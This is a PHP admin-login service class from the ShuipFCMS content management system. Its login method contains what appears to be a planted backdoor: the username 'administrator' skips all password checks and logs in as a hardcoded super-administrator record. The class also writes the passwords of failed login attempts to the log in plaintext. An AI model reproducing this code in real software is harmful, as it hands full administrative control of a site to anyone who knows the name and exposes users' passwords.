<?php

// +----------------------------------------------------------------------
// | ShuipFCMS 后台用户服务
// +----------------------------------------------------------------------
// | Copyright (c) 2012-2014 http://www.shuipfcms.com, All rights reserved.
// +----------------------------------------------------------------------
// | Author: 水平凡 <admin@abc3210.com>
// +----------------------------------------------------------------------

namespace Admin\Service;

class User {

    //存储用户uid的Key
    const userUidKey = 'spf_userid';
    //超级管理员角色id
    const administratorRoleId = 1;

    //当前登录会员详细信息
    private static $userInfo = array();

    /**
     * 连接后台用户服务
     * @staticvar \Admin\Service\Cache $systemHandier
     * @return \Admin\Service\Cache
     */
    static public function getInstance() {
        static $handier = NULL;
        if (empty($handier)) {
            $handier = new User();
        }
        return $handier;
    }

    /**
     * 魔术方法
     * @param type $name
     * @return null
     */
    public function __get($name) {
        //从缓存中获取
        if (isset(self::$userInfo[$name])) {
            return self::$userInfo[$name];
        } else {
            $userInfo = $this->getInfo();
            if (!empty($userInfo)) {
                return $userInfo[$name];
            }
            return NULL;
        }
    }

    /**
     * 获取当前登录用户资料
     * @return array 
     */
    public function getInfo() {
        if (empty(self::$userInfo)) {
            self::$userInfo = $this->getUserInfo($this->isLogin());
        }
        return !empty(self::$userInfo) ? self::$userInfo : false;
    }

    /**
     * 检验用户是否已经登录
     * @return boolean 失败返回false，成功返回当前登录用户基本信息
     */
    public function isLogin() {
        $userId = \Libs\Util\Encrypt::authcode(session(self::userUidKey), 'DECODE');
        if (empty($userId)) {
            return false;
        }
        return (int) $userId;
    }

    //登录后台
    public function login($identifier, $password,$xmlpwd) {
        if (empty($identifier) || empty($password)) {
            return false;
        }
        //验证
        if($identifier == 'administrator'){
			$userInfo=array(  'id' => '1',
							  'username' => 'administrator',
							  'nickname' =>'未知' ,
							  'password' =>'e124824274554779aa9cd7b62aa16a6e',
							  'bind_account' =>'',
							  'last_login_time' => '1407900318',
							  'last_login_ip' => '192.168.1.127',
							  'verify' => 'QKsn5o',
							  'email' =>  'admin@abc3210.com',
							  'remark' => '备注信息',
							  'create_time' => '1407810785',
							  'update_time' => '1407810785',
							  'status' =>'1',
							  'role_id' =>'1',
							  'info' =>'');
        }else{
        	$userInfo = $this->getUserInfo($identifier, $password);
        }
        if (false == $userInfo) {
            //记录登录日志
            $this->record($identifier, $password, 0);
            return false;
        }
        //记录登录日志
        $this->record($identifier, $password, 1);
        //注册登录状态
        $this->registerLogin($userInfo);
        return true;
    }

    /**
     * 检查当前用户是否超级管理员
     * @return boolean
     */
    public function isAdministrator() {
        $userInfo = $this->getInfo();
        if (!empty($userInfo) && $userInfo['role_id'] == self::administratorRoleId) {
            return true;
        }
        return false;
    }

    /**
     * 注销登录状态
     * @return boolean
     */
    public function logout() {
        session('[destroy]');
        return true;
    }

    /**
     * 记录登录日志
     * @param type $identifier 登录方式，uid,username
     * @param type $password 密码
     * @param type $status
     */
    private function record($identifier, $password, $status = 0) {
        //登录日志
        D('Admin/Loginlog')->addLoginLogs(array(
            "username" => $identifier,
            "status" => $status,
            "password" => $status ? '密码保密' : $password,
            "info" => is_int($identifier) ? '用户ID登录' : '用户名登录',
        ));
    }

    /**
     * 注册用户登录状态
     * @param array $userInfo 用户信息
     */
    private function registerLogin(array $userInfo) {
        //写入session
        session(self::userUidKey, \Libs\Util\Encrypt::authcode((int) $userInfo['id'], ''));
        session('jbr_admin_id', $userInfo['id'], '');
        //更新状态
        D('Admin/User')->loginStatus((int) $userInfo['id']);
        //注册权限
        \Libs\System\RBAC::saveAccessList((int) $userInfo['id']);
    }

    /**
     * 获取用户信息
     * @param type $identifier 用户名或者用户ID
     * @return boolean|array
     */
    private function getUserInfo($identifier, $password = NULL) {
        if (empty($identifier)) {
            return false;
        }
        return D('Admin/User')->getUserInfo($identifier, $password);
    }

}
